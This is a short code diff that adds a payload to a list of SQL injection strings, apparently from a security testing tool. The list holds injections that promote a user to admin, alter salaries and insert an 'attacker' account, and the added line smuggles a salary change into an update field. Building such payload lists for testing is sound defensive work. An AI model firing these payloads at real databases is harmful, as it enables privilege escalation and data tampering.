@@ -36,6 +36,7 @@ sql_payloads = [
     # Update-based
     "'; UPDATE users SET role='admin' WHERE username='victim'; --",
     "abc'; UPDATE users SET salary='9999' WHERE name='Alice'; --",
+    "x', salary=100000#",
 
     # Insert-based
     "'; INSERT INTO users (username, password) VALUES ('attacker','pass'); --",
